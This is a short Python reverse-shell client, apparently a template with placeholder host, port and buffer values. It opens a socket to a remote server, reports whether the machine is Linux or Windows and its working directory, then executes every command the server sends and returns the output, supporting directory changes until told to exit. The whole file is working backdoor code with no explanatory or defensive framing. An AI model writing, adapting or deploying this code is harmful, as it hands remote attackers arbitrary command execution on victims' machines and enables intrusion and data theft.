#!/usr/bin/python3

import socket
import os
import subprocess

SERVER_HOST = {IP}
SERVER_PORT = {PORT}
BUFFER_SIZE = {BUFFER_SZIE}
SEPARATOR = "<sep>"
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
tout = subprocess.getoutput("ls")
if ('recognized' not in tout):
    s.send('linux'.encode())
else:
    s.send('windows'.encode())
del tout
cwd = os.getcwd()
s.send(cwd.encode())
while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()